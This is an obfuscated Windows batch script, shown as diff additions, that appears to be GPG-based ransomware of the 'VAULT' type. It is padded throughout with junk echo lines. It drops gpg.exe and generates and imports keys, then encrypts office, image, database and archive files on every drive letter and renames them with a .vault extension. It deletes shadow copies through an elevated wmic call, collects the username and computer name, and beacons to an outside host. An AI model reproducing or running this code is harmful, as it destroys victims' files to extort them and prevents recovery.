+echo sPE3as8pHaResW583YuwrUdraz4fraFr &gt;nul
+) else (
+echo wra7ap4ve3rezUCufRamAQeJUPaste4A &gt;nul
+echo fr8chADr8phubuca4atHu7ebrezeXuc8 &gt;nul
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+goto 871c371d
+)
+rename "%temp%\design.css" "gpg.exe"
+copy /y "%temp%\design.css" "%temp%\gpg.exe"
+del /f /q "%temp%\design.css"
+echo fr8chADr8phubuca4atHu7ebrezeXuc8 &gt;nul
+echo nes2AzanaBU2AtaST4wUzEc5anAd5U5e &gt;nul
+echo pUprESPeResWaZuPrasw38eduzEBruzA &gt;nul
+chcp 866
+set 715c7be3=!RANDOM!
+set b67b5d00=!RANDOM!
+echo yAphareSwu4UtAspetrukatRes84etha &gt;nul
+echo 3RAFaY8dUtremaserabAtr7MagEbrAd8 &gt;nul
+set dc841a88=!RANDOM!
+set db5a2d8a=!RANDOM!
+echo yAphareSwu4UtAspetrukatRes84etha &gt;nul
+echo 3RAFaY8dUtremaserabAtr7MagEbrAd8 &gt;nul
+set ee1f189d=!RANDOM!
+set 2162ea2b=!RANDOM!
+echo yAphareSwu4UtAspetrukatRes84etha &gt;nul
+echo 3RAFaY8dUtremaserabAtr7MagEbrAd8 &gt;nul
+set 58d179b8=!RANDOM!
+set 3d645b52=RU
+if exist "%APPDATA%\gnupg" RENAME "%APPDATA%\gnupg" gnupg_%random%
+echo yAphareSwu4UtAspetrukatRes84etha &gt;nul
+echo 3RAFaY8dUtremaserabAtr7MagEbrAd8 &gt;nul
+echo Key-Type: RSA&gt; "%temp%\9c668934.2ca1046c"
+echo Key-Length: 1024&gt;&gt; "%temp%\9c668934.2ca1046c"
+echo yAphareSwu4UtAspetrukatRes84etha &gt;nul
+echo 3RAFaY8dUtremaserabAtr7MagEbrAd8 &gt;nul
+echo Name-Real: Cellar&gt;&gt; "%temp%\9c668934.2ca1046c"
+echo yAphareSwu4UtAspetrukatRes84etha &gt;nul
+echo 3RAFaY8dUtremaserabAtr7MagEbrAd8 &gt;nul
+
+"%temp%\gpg.exe" --batch --homedir "%temp%" --gen-key "%temp%\9c668934.2ca1046c"
+echo CUdUbruTra6rafarafReduhepadraYug &gt;nul
+echo te6eVUW8e5eR5chUGachef4nu6r3xenU &gt;nul
+echo -----BEGIN PGP PUBLIC KEY BLOCK-----&gt; "%temp%\03dfb98e.7087b06e"
+echo CUdUbruTra6rafarafReduhepadraYug &gt;nul
+echo te6eVUW8e5eR5chUGachef4nu6r3xenU &gt;nul
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+echo Version: GnuPG v1&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo thefr4brUYe36aFrecHathePr7CAFanE &gt;nul
+echo trufufrecrututheg5prewrefeXaswe3 &gt;nul
+echo.&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo thefr4brUYe36aFrecHathePr7CAFanE &gt;nul
+echo trufufrecrututheg5prewrefeXaswe3 &gt;nul
+echo mI0EVbFePwEEAMM+eRmPkcVTTwqLOyCkSlOTDjfnJpU2vTt94yMq1c1Ix1RF2fxp&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo thefr4brUYe36aFrecHathePr7CAFanE &gt;nul
+echo trufufrecrututheg5prewrefeXaswe3 &gt;nul
+echo S9ZDuQ9qfhqUxXiUtsEY7kB1pHtcyCeqtdrYST4YzJTeNCZNTiq2mVkQlPXqcvO/&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo hXpyYH/DNB6XmdQP9rmb/gIb5qHpRNoWlb1MBDZAJnHU3PEA2LcXbBX/ABEBAAG0&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo ClZhdWx0Q3J5cHSIuAQTAQIAIgUCVbFePwIbLwYLCQgHAwIGFQgCCQoLBBYCAwEC&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo thefr4brUYe36aFrecHathePr7CAFanE &gt;nul
+echo trufufrecrututheg5prewrefeXaswe3 &gt;nul
+echo HgECF4AACgkQ+Zg2Eii5y+eiQQQAm9r0sfXO5pp4/yy6lJG+zZAiijgzECVAQvw9&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo j+JE6n7mZnZDm632PrLumTHE9PauifXmyTFf0RPUI/D5B8QFPQn9hoNf041aaEgq&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo thefr4brUYe36aFrecHathePr7CAFanE &gt;nul
+echo trufufrecrututheg5prewrefeXaswe3 &gt;nul
+echo bTQSy7TIwZJfTyZyq/yhJiH0RLI7yhj/88sjX+uu7miGHO9jb1ygTo/qe5n3Q/Vp&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo xpSJJFU=&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo PreQ3baxuwuP42EX2tepeTra5rA6eN4C &gt;nul
+echo ZewrU5u8A4A8Ra5He2heXeWr6bRuzePU &gt;nul
+echo =CuiR&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo -----END PGP PUBLIC KEY BLOCK-----&gt;&gt; "%temp%\03dfb98e.7087b06e"
+echo PreQ3baxuwuP42EX2tepeTra5rA6eN4C &gt;nul
+echo ZewrU5u8A4A8Ra5He2heXeWr6bRuzePU &gt;nul
+
+"%temp%\gpg.exe" -r Cellar --export-secret-keys --yes --homedir "%temp%" -a&gt; "%temp%\3637bf69.36ddf8fe"
+del /f /q "%temp%\9c668934.2ca1046c"
+echo PreQ3baxuwuP42EX2tepeTra5rA6eN4C &gt;nul
+echo ZewrU5u8A4A8Ra5He2heXeWr6bRuzePU &gt;nul
+echo.&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo BDATE: !DATE!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo PreQ3baxuwuP42EX2tepeTra5rA6eN4C &gt;nul
+echo ZewrU5u8A4A8Ra5He2heXeWr6bRuzePU &gt;nul
+echo UNAME: !USERNAME!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo CNAME: !COMPUTERNAME!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo PQQID: AKG-4813&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo ULANG: !3d645b52!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo PreQ3baxuwuP42EX2tepeTra5rA6eN4C &gt;nul
+echo ZewrU5u8A4A8Ra5He2heXeWr6bRuzePU &gt;nul
+echo 01HSH: !715c7be3!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 02HSH: !b67b5d00!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 03HSH: !db5a2d8a!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo PreQ3baxuwuP42EX2tepeTra5rA6eN4C &gt;nul
+echo ZewrU5u8A4A8Ra5He2heXeWr6bRuzePU &gt;nul
+echo 04HSH: !dc841a88!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 05HSH: !ee1f189d!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo PreQ3baxuwuP42EX2tepeTra5rA6eN4C &gt;nul
+echo ZewrU5u8A4A8Ra5He2heXeWr6bRuzePU &gt;nul
+echo FHASH: !2162ea2b!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo chcp 866 &gt; "%temp%\61231f25.9db8b89a"
+echo 3ekudesewekePrUBreqAcrabrastUCHu &gt;nul
+echo spEfAch6gaCHetHuMEM2fUgexuj27rAS &gt;nul
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :1010f32d %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo 3ekudesewekePrUBreqAcrabrastUCHu &gt;nul
+echo spEfAch6gaCHetHuMEM2fUgexuj27rAS &gt;nul
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 01FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto 441f5342
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+:1010f32d
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.xls *.doc) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+:441f5342
+echo Set objShell = CreateObject^("Shell.Application"^) &gt; "%temp%\59665d79.vbs"
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+echo Set objWshShell = WScript.CreateObject^("WScript.Shell"^) &gt;&gt; "%temp%\59665d79.vbs"
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+echo Set objWshProcessEnv = objWshShell.Environment^("PROCESS"^) &gt;&gt; "%temp%\59665d79.vbs"
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+echo objShell.ShellExecute "wmic.exe", "shadowcopy delete /nointeractive", "", "runas", 0 &gt;&gt; "%temp%\59665d79.vbs"
+echo var cdp="%%TEMP%%\\69aca909.cmd";var WshShell=CreateObject("WScript.Shell");cdp=WshShell.ExpandEnvironmentStrings(cdp);function CreateObject(fq){return new ActiveXObject(fq)}function xx(cdp){WshShell.Run(cdp,0,0);}xx(''+cdp+'');&gt; "%temp%\acda3f33.js"
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+echo.&gt; "%temp%\69aca909.cmd"
+echo SetLocal EnableDelayedExpansion&gt;&gt; "%temp%\69aca909.cmd"
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+echo for /f "tokens=2*" %%%%i in ^('reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentVersion"'^) do set fnd7=%%%%j&gt;&gt; "%temp%\69aca909.cmd"
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+echo if not %%fnd7:~0,1%% GEQ 6 goto a3811a18&gt;&gt; "%temp%\69aca909.cmd"
+echo 3wucHePReXafUtHex5s2FeyU4efugaza &gt;nul
+echo nUFaw6hSdgyahjdgahjdiuaerEkam5 &gt;nul
+echo jureqAprE8Anap2AxED7Et4ucHathaZU &gt;nul
+echo set ntries=^0&gt;&gt; "%temp%\69aca909.cmd"
+echo :3c843d11&gt;&gt; "%temp%\69aca909.cmd"
+echo wscript.exe //B //Nologo "%%temp%%\59665d79.vbs"^&amp; tasklist^|findstr /i wmic.exe&gt;&gt; "%temp%\69aca909.cmd"
+echo if not ^^!errorlevel^^!==0 ^(&gt;&gt; "%temp%\69aca909.cmd"
+echo swETEcHukuSpaj7q2CAQu8ESa3rUzaq3 &gt;nul
+echo dA8ruKA4EsePr4PHaYUWrUStaV2pahe3 &gt;nul
+echo set /a ntries+=^1&gt;&gt; "%temp%\69aca909.cmd"
+echo if not ^^!ntries^^! GEQ 16 goto 3c843d11&gt;&gt; "%temp%\69aca909.cmd"
+echo ^)&gt;&gt; "%temp%\69aca909.cmd"
+echo swETEcHukuSpaj7q2CAQu8ESa3rUzaq3 &gt;nul
+echo dA8ruKA4EsePr4PHaYUWrUStaV2pahe3 &gt;nul
+echo :a3811a18&gt;&gt; "%temp%\69aca909.cmd"
+echo del /f /q "%temp%\acda3f33.js"&gt;&gt; "%temp%\69aca909.cmd"
+echo del /f /q "%temp%\59665d79.vbs"&gt;&gt; "%temp%\69aca909.cmd"
+echo swETEcHukuSpaj7q2CAQu8ESa3rUzaq3 &gt;nul
+echo dA8ruKA4EsePr4PHaYUWrUStaV2pahe3 &gt;nul
+echo echo del /f /q "%temp%\59665d79.vbs"&gt;&gt; "%temp%\69aca909.cmd"
+echo echo 1107cc4c ^&gt; "%%temp%%\69aca909.cmd"&gt;&gt; "%temp%\69aca909.cmd"
+start wscript.exe //B //Nologo "%temp%\acda3f33.js"
+echo swETEcHukuSpaj7q2CAQu8ESa3rUzaq3 &gt;nul
+echo dA8ruKA4EsePr4PHaYUWrUStaV2pahe3 &gt;nul
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :c68cd952 %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 02FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto 9b100e11
+echo swETEcHukuSpaj7q2CAQu8ESa3rUzaq3 &gt;nul
+echo dA8ruKA4EsePr4PHaYUWrUStaV2pahe3 &gt;nul
+:c68cd952
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.pdf *.rtf) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+:9b100e11
+echo x5fawEmawuZA7pu7amES7uZUdega7u6E &gt;nul
+echo daprE8ESWUDaja3hUprawrUyaSEbEBe4 &gt;nul
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :a556dfcb %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 03FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto cd9f3e2a
+
+echo x5fawEmawuZA7pu7amES7uZUdega7u6E &gt;nul
+echo daprE8ESWUDaja3hUprawrUyaSEbEBe4 &gt;nul
+:a556dfcb
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.psd *.dwg *.cdr) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+:cd9f3e2a
+FOR %%f IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :071faa5e %%f
+echo if exist "%%TeMp%%\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 04FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto e0aede1c
+:071faa5e
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.cd *.mdb *.1cd *.dbf *.sqlite) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+:e0aede1c
+FOR %%s IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :f941ecc1 %%s
+echo if exist "%%TeMp%%\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%AppDATA%%\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo if exist "%%USERPROFILE%%\Desktop\VAULT.KEY" echo 05FNSH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+goto ca70214e
+:f941ecc1
+dir /B "%1:\"&amp;&amp; for /r "%1:\" %%i in (*.jpg *.zip) do (
+echo "%%TeMp%%\gpg.exe" -r Cellar --yes -q --no-verbose --trust-model always --encrypt-files "%%i"^&amp; move /y "%%i.gpg" "%%i"^&amp; RENAME "%%i" "%%~nxi.vault"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo %%i&gt;&gt; "%temp%\21b0fb7b.7ca0ec0c"
+)
+goto:eof
+:ca70214e
+set loco=!random!!random!
+echo x5fawEmawuZA7pu7amES7uZUdega7u6E &gt;nul
+echo daprE8ESWUDaja3hUprawrUyaSEbEBe4 &gt;nul
+echo function CreateObject^(b^){return new ActiveXObject^(b^)} &gt;&gt; !loco!.js
+echo ahdkUAHFahjdkuhjau82uhdADUKshd7rq &gt;nul
+echo prEMayafRuDubrug3fRUmEChubrustuy &gt;nul
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+echo frEchUS3eSwEB6espeb4kEXuc2EChAsp &gt;nul
+echo function ok^(b^){var c=new ActiveXObject^("MSXML2.XMLHTTP"^);c.open^("GET",b,0^);c.send^(^)} &gt;&gt; !loco!.js
+echo ahdkUAHFahjdkuhjau82uhdADUKshd7rq &gt;nul
+echo prEMayafRuDubrug3fRUmEChubrustuy &gt;nul
+echo frEchUS3eSwEB6espeb4kEXuc2EChAsp &gt;nul
+echo ok^("http://attached-email.com/c1.php"^); &gt;&gt; !loco!.js
+echo ahdkUAHFahjdkuhjau82uhdADUKshd7rq &gt;nul
+echo prEMayafRuDubrug3fRUmEChubrustuy &gt;nul
+echo frEchUS3eSwEB6espeb4kEXuc2EChAsp &gt;nul
+wscript.exe //B //nologo //T:40 "!loco!.js"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+echo echo FHASH-OK^&gt;^&gt; "%%TeMp%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo echo FHASH-OK^&gt;^&gt; "%%AppDATA%%\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+echo echo FHASH-OK^&gt;^&gt; "%%USERPROFILE%%\Desktop\VAULT.KEY"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo echo 1e759748 ^&gt; "%%TeMp%%\4c2e533d.cmd"&gt;&gt; "%temp%\61231f25.9db8b89a"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+echo del /f /q "%%TeMp%%\4c2e533d.cmd"&gt;&gt; "%temp%\61231f25.9db8b89a"
+findstr /i /v "windows recycle program avatar roaming msoffice temporary sample themes uploads csize resource internet com_ intel common resources texture profiles library clipart manual games framework64 setupcache autograph maps amd64 cache support guide abbyy application thumbnails avatars template adobe" "%temp%\21b0fb7b.7ca0ec0c"&gt; "%temp%\97cf86b0.e479bce7"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+findstr /i /v "windows recycle program avatar roaming msoffice temporary sample themes uploads csize resource internet com_ intel common resources texture profiles library clipart manual games framework64 setupcache autograph maps amd64 cache support guide abbyy application thumbnails avatars template adobe" "%temp%\61231f25.9db8b89a"&gt; "%temp%\f2a431bc.6ccc04ec"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+findstr /v "AppData APPDATA appdata temp TEMP Temp" "%temp%\97cf86b0.e479bce7"&gt; "%temp%\8f9c3dbb.9767d548"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+findstr /v "AppData APPDATA appdata temp TEMP Temp" "%temp%\f2a431bc.6ccc04ec"&gt; "%temp%\4c2e533d.cmd"
+del /f /q "%temp%\97cf86b0.e479bce7"
+del /f /q "%temp%\f2a431bc.6ccc04ec"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+del /f /q "%temp%\21b0fb7b.7ca0ec0c"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+del /f /q "%temp%\61231f25.9db8b89a"
+echo XCONF: !58d179b8!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+set 3a3b7af1=66668
+for /f %%f in ('find /c /v ""^&lt; "%temp%\8f9c3dbb.9767d548"') do (
+set 3a3b7af1=%%f
+)
+echo swuQAtapas74dABrupRAk4geCrU4aSuC &gt;nul
+echo W5espeWrezu5A6hUhuBRU5evemupH2cE &gt;nul
+echo V33rhYGgfyisahdgJFKASDadbahsgvjdWaga &gt;nul
+echo speFrez4chE3asw4RebrU32haGedaDAD &gt;nul
+echo QNTTY: !3a3b7af1!&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+for %%c IN (01:xls 04:doc 05:rtf 10:pdf 11:psd 12:dwg 13:cdr 19:cd 20:mdb 21:1cd 23:dbf 24:sqlite 26:jpg 27:zip) do (
+for /f "tokens=1,2 delims=:" %%i in ("%%c") do (
+for /f %%b in ('find /c /i ".%%j"^&lt; "%temp%\8f9c3dbb.9767d548"') do (
+echo %%iEXT: %%b&gt;&gt; "%temp%\3637bf69.36ddf8fe"
+)))
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+echo 02EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 03EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+echo 06EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 07EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 08EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 09EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+echo 14EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 15EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 16EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+echo 17EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 18EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 22EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+echo 25EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo 28EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+echo 29EXT: 0 &gt;&gt; "%temp%\3637bf69.36ddf8fe"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo NateBRaCu2ruphEbruPhATHeRAMe6rab &gt;nul
+echo sTEhet8TAveg2cek8neCuH3cR4f5xu3r &gt;nul
+echo.&gt;&gt; "%temp%\8f9c3dbb.9767d548"
+echo XCONF: !58d179b8!&gt;&gt; "%temp%\8f9c3dbb.9767d548"
+echo thu83E7r88Erup7etUbRuzaqathUchaB &gt;nul
+echo 9kYTla1Z2v4RqBIe7bMIphoN3yZ6zJ9z21bn1NK3CN4TBuBPkb
+echo VwmmrE52cmWxWNq5CiI2cHZHMRSewEE0uq254wS5VjlQNunrBY
